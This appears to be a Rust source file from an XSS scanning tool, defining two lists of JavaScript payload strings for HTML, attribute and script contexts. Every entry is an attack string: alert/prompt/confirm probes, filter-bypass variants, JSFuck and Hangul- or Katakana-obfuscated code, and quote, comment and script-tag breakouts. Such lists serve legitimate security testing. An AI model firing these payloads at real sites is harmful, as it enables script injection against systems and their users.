// inHTML, inAttr, ETC
pub const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
    "alert(1)",                      // alert
    "prompt`1`",                     // prompt with backtick
    "confirm(1)",                    // confirm
    "(_=prompt,_(1))",               // prompt with bypass technique
    "(((confirm)))``",               // confirm with bypass technique
    "[2].find(alert)",               // alert with bypass technique
    "top[\"al\"+\"\\ert\"](1)",      // alert with bypass technique2
    // Filter bypass: no parentheses
    "alert`1`",                      // alert with backtick (no parens)
    // Filter bypass: using window object
    "window['alert'](1)",            // window.alert
    // Filter bypass: constructor technique
    "[].constructor.constructor('alert(1)')()", // constructor bypass
];

// for inJS
pub const XSS_JAVASCRIPT_PAYLOADS: &[&str] = &[
    "alert(1)",                                                         // alert
    "alert`1`",                                                         // alert with backtick
    "prompt(1)",                                                        // prompt
    "prompt`1`",                                                        // prompt with backtick
    "confirm`1`",                                                       // prompt with backtick
    "confirm(1)",                                                       // confirm
    "x=new DOMMatrix;matrix=confirm;x.a=1;location='javascript'+':'+x", // confirm with DOMMatrix
    "this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])", // jsfuck
    "([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()", // jsfuck + hangul
    "([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()", // jsfuck + katakana
    // Filter bypass variations for JS context
    "'-alert(1)-'",                  // JS string breakout
    "\"-alert(1)-\"",                // JS double-quoted string breakout
    ";alert(1)//",                   // Statement separator with comment
    "};alert(1)//",                  // Object close + statement
    "];alert(1)//",                  // Array close + statement
    "*/alert(1)/*",                  // Comment breakout
    "</script><script>alert(1)</script>", // Script tag breakout
    "\\');alert(1)//",               // Escaped quote breakout
    "\\\");alert(1)//",              // Escaped double quote breakout
];
